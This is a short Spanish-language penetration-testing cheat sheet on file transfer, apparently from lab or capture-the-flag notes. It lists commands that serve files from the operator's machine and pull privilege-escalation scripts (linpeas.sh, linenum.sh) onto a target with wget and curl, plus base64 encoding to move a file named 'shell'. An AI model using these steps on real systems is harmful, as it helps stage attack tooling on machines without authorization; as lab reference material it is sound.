---------------
#fileTransfer
 
-------

|                                                        |                                                                         |
| ------------------------------------------------------ | ----------------------------------------------------------------------- |
| **Transferencia de archivos**                          |                                                                         |
| `python3 -m http.server 8000`                          | Iniciar un servidor web local                                           |
| `wget http://10.10.14.1:8000/linpeas.sh`               | Descargue un archivo en el servidor remoto desde nuestra máquina local  |
| `curl http://10.10.14.1:8000/linenum.sh -o linenum.sh` | Descargue un archivo en el servidor remoto desde nuestra máquina local  |
| `scp linenum.sh user@remotehost:/tmp/linenum.sh`       | Transfiera un archivo al servidor remoto con (requiere acceso SSH)`scp` |
| `base64 shell -w 0`                                    | Convertir un archivo a `base64`                                         |
| `echo f0VMR...SNIO...InmDwU \| base64 -d > shell`      | Convertir un archivo de nuevo a su origen`base64`                       |
| `md5sum shell`                                         |                                                                         |